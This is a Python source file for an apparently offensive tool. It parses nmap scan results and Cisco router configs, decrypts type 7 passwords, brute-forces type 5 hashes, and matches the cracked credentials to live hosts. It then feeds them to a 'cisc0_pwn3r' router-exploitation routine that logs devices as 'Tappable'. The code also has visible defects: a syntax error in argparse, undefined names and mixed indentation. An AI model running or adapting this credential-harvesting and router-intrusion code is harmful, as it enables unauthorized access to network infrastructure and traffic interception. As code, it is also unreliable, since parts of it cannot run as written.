#Compares nmap scan to config dir, cracks and gives concise info doing whois lookups
from __future__ import print_function, unicode_literals
from os import walk
import re
import sys
from ipwhois import IPWhois
import argparse
from argparse import Namespace
from libnmap.process import NmapProcess
from libnmap.parser import NmapParser, NmapParserException
import string
from datetime import datetime
from threading import Thread
import threading
import time
from BLUE_CYBORG import *
from multiprocessing.pool import ThreadPool
from WANING_FALCON import *

as_list = []
f = []
updated_dics = []
found_hosts_open = []
found_hosts_closed = []
local_dicts = []
login_points = []
epc_tappable = []
xlat = [0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41, 0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c, 0x64
, 0x4a, 0x4b, 0x44, 0x48, 0x53, 0x55, 0x42, 0x73, 0x67, 0x76, 0x63, 0x61, 0x36, 0x39, 0x38, 0x33, 0x34, 0x6e, 0x63,
0x78, 0x76, 0x39, 0x38, 0x37, 0x33, 0x32, 0x35, 0x34, 0x6b, 0x3b, 0x66, 0x67, 0x38, 0x37]


def detect_hijack_participation(as_list_in):
    detected_participations = []
    #was one of Your systems used to conduct an attack check and see
    as_num,events = one_up_top()
    cleaned_asnums = remove_duplicates(as_num)
    for asnums in cleaned_asnums:
        for vic_as in as_list_in:
            if vic_as in asnums:
                print("You May Have Fallen Victim to a Hack that allows Hackers To Conduct An BGP Hijacking Attack")
                print("Your AS Number Has Possibly been Detected By the BGPSTREAM Site As generating incorrect prefixes You Do not Own")
                for event in events:
                    if vic_as in event:
                       result = {'Victim_AS':vic_as,'event':event}
                       detected_participations.append(result)
            else:
                pass
    return detected_participations


#https://github.com/axcheron/cisco_pwdecrypt/blob/master/cisco_pwdecrypt.py
def type5_decrypt(enc_pwd, dictionary):
    #changed axcherons code due to dict conflicting with a python data type modified to return cracked hash
    print("[*] Bruteforcing 'type 5' hash  enc_pwd ...\n")

    # Count passwords in the wordlist
    passnum = linecounter(dictionary)
    print("\tFound %d passwords to test." % passnum)

    try:
        passf = open(dictionary, 'rb')
    except IOError:
        print('[ERR] Cannot open:', dictionary)
        exit(-1)

    # Splitting hash
    split_pwd = enc_pwd.split('$')

    print("\tTesting: %s" % enc_pwd)
    if split_pwd[1] == '1':
        print("\tHash Type = MD5")
    else:
        print("\t[ERR] Your 'type 5' hash is not valid.")
        exit(-1)

    print("\tSalt = %s" % split_pwd[2])
    print("\tHash = %s\n" % split_pwd[3])

    count = 0
    for line in passf.readlines():
        # random status
        if random.randint(1, 100) == 42:
            print("\t[Status] %d/%d password tested..." % (count, passnum))
        if md5_crypt.encrypt(line.rstrip(), salt=split_pwd[2]) == enc_pwd:
            print("\n[*] Password Found = %s" % line.decode("utf-8") )
            return line.decode("utf-8")
        count += 1
    print("\t[-] Password Not Found. You should try another dictionary.")



   
def decrypt_type7(ep):
    """
    Based on http://pypi.python.org/pypi/cisco_decrypt/
    Regex improved
    """
    dp = ''
    regex = re.compile('(^[0-9A-Fa-f]{2})([0-9A-Fa-f]+)')
    result = regex.search(ep)
    s, e = int(result.group(1)), result.group(2)
    for pos in range(0, len(e), 2):
	magic = int(e[pos] + e[pos+1], 16)
	if s <= 50:
	   # xlat length is 51
	   newchar = '%c' % (magic ^ xlat[s])
	   s += 1
	   if s == 51: s = 0
	   dp += newchar
    return dp       




   
def remove_duplicates(l):
    return list(set(l))




def load_results(pathto):
    users_found = []
    for (dirpath, dirnames, filenames) in walk(pathto):
      f.extend(filenames)
      break

    for files in f:
        url = files
        url = re.sub('\.conf$', '', url)
        file_path_to = pathto + files 
        try:
            for line in open(file_path_to):
                
                tmp_username = ''
                tmp_password = ''
                tmp_enable_pass = ''
                if "username" in line:
                   #extract username could add piece to look for enable pass  for now assume pass is enable mode pass very clunky 
                   s = line[:50]
                   start = s.find('username') + 8
                   end = s.find('privilege', start)
                   result_string = s[start:end].split()
                   i = 0
                   while i < 1:
                       if len(result_string[i]) > 3:
                         
                          if result_string[i]:
                             tmp_username = result_string[i]
                            
                       i += 1
              
                if "password 7" in line:
                  #extract pass  
                   s = line[:100]
                   
                   new_list =  s.split()
                   password = new_list[-1]
                   cracked = decrypt_type7(password)
                   
                   if tmp_username:
                      local_dict = {'host':url,"username":tmp_username,"password":cracked}
                      local_dicts.append(local_dict)
                
                if "secret 5" in line:
                   passesout = open("type5s.txt","a")
                   
                   s = line[:50]
                   #wondering if logic is correct maybe someone can help
                   new_list =  s.split()
                   username = new_list[1]
                   password = new_list[-1]
                   if "secret" not in username:
                      passesout.write(username+":"+password+"\n")
                      print(username+":"+password+"\n")
                      passesout.close()

        except:
            pass



def get_whois(host):
    try:
       w =IPWhois(host).lookup_rws()
       if w:
          return w
    except:
        pass

    
def report_parser(report):
    ''' Parse the Nmap XML report '''
    for host in report.hosts:
        ip = host.address

        if host.is_up():
            hostname = 'N/A'
           
            if len(host.hostnames) != 0:
               hostname = host.hostnames[0]
               print(hostname+":"+str(ip))
                  
            for s in host.services:

          
                if s.open():
                   serv = s.service
                   port = s.port
                   dead_fall = {'host':format(ip),'port':format(port),'service':format(serv)}
                   found_hosts_open.append(dead_fall)
                else:
                   found_hosts_closed.append(format(ip))
             


def man_down(login_points):
    cleaned2 = [dict(t) for t in set([tuple(d.items()) for d in login_points])]
    cleaner = open('passes.txt','a')
    
    for done in cleaned2:

        try:
           cleaner.write(str(done)+"\n")
           n = Namespace(**done)
           host = n.host
           user = n.username
           password = n.password
           port = n.port
           pool = ThreadPool(processes=2)
           async_result = pool.apply_async(cisc0_pwn3r, (host, user,password,port)) 
           is_vuln = async_result.get()
           if is_vuln:
              Epc_Taps = open('Tappable.txt','a')
              print("Logging The Fact This Router is Tappable")
              local_dict = {"host":host,"user":user,"password":password,"port":port,"EPC_TAP":"True"}
              
              Epc_Taps.write(str(local_dict)+"\n")
              Epc_Taps.flush()
              Epc_Taps.close()
        except:
           pass
    
        
    cleaner.close()
    


def crack_5s(pass_list):
    filewrk = open("type5s.txt","r")
    for password in filewrk:
        try:
           tmp_pass = password.split(':')
           pool = ThreadPool(processes=2)
           async_result = pool.apply_async(type5_decrypt,(passlist, tmp_pass[0])) 
           cracked = async_result.get()
           if cracked:
              print(cracked)
        except:
            pass
        

def execute_whois(login_points):
    #grab whois to report do the right thing
    info_out = open("asnums.txt","a")
    for points in login_points:
        try:
           pool = ThreadPool(processes=2)
           async_result = pool.apply_async(get_whois, (points['host'],)) 
           whois_info = async_result.get()
           print(whois_info)
           new_dict = {"host":points['host'],'port':points['port'],'username':points['username'],'password':points['password'],'asn_cidr':whois_info['asn_cidr'],'asn':whois_info['asn'],'nets':whois_info['nets']}
           updated_dics.append(new_dict)
           as_list.append(whois_info['asn'])
           #also write to file to make easier for later function
           info_out.write(whois_info['asn']+"\n")
           print("Autonomous Sytem Name:"+whois_info['asn'])
           print(new_dict)
            
        except:
            print("NO Whois")
            pass

def work_load(nmap_report,pathto,pass_list):
    write_file3 = open('passes.txt','a')
    filewrker = open('whois_bundle.txt','a')
    report = NmapParser.parse_fromfile(nmap_report)
    load_results(pathto)
    ip_list = []
    flagged_matches = []
    report_parser(report)

    for item in local_dicts:
        
        for key, value in item.items():
            if "Router IP" in key:
               router_ip =  value
               ip_list.append(router_ip)
               
    #possible logic error but not positive
    print('List of Possible Cracked Dicts Out of Configs:'+""+str(len(local_dicts)))
    print('Hosts Found With Open Ports:' +""+str(len(found_hosts_open)))
    
    
    cleaned = [dict(t) for t in set([tuple(d.items()) for d in local_dicts])]
    for host_open in found_hosts_open:
        for key, value in host_open.items():
            if "host" in key:
                tmp_host =  value
                for logins in local_dicts:
                    for key, value in logins.items():
                        if "host" in key:
                           tmp_host2 =  value
                           if tmp_host  == tmp_host2:
                              
                              print(tmp_host +":"+tmp_host2+ " Match Found Between Host and Craked Config")
                              prepped_login = {'host':host_open['host'],'port':host_open['port'],'username':logins['username'],'password':logins['password']}
                              login_points.append(prepped_login)
                           

    
    
    print("Entering Login Buster Routine")
    print(len(login_points))
    
    for points in login_points:
        write_file3.write(str(points)+"\n")
    '''  
    t = Thread(target=man_down, args=(login_points,))
    t.start()
    t.join()
    
    
    
    '''
    t = Thread(target=execute_whois, args=(login_points,))
    t.start()
    t.join()
    
   
    
    for updates in updated_dics:
        filewrker.write(str(updates)+"\n")

    
    for updates in as_list:
        if updates:
           print(updates+"\n")
           
        else:
            pass

   
    as_list_test = open("asnums.txt","r")
    
    results = detect_hijack_participation(as_list_test)
    if results:
       for items in results:
           print(items+"\n")
    else:
        pass
    '''
    #cant get this to run on my pc well on any decent wordlist
    t = Thread(target=crack_5s, args=(pass_list,))
    t.start()
    t.join()
    '''
    write_file3.close()
    filewrker.close()
    
def main():


    parser = argparse.ArgumentParser()
    parser.add_argument("-x", help="Nmap XML file to parse")
    parser.add_argument("-c", help="Path to Configs")
    parser.add_argument("-w", help="Password List To Crack Type 5's  # not implemented yet"
    args = parser.parse_args()
  
    if args.c:
       if args.x:
          pathto = args.c
          pass_list = args.w
          t = Thread(target=work_load, args=(args.x,pathto,pass_list))
          t.start()
          t.join()

    
     
    else:
        os._exit(1)
    
    

       
if __name__ == '__main__':
    try:
        main()
        
    except KeyboardInterrupt:
          time.sleep(0.2)
          os._exit(1)
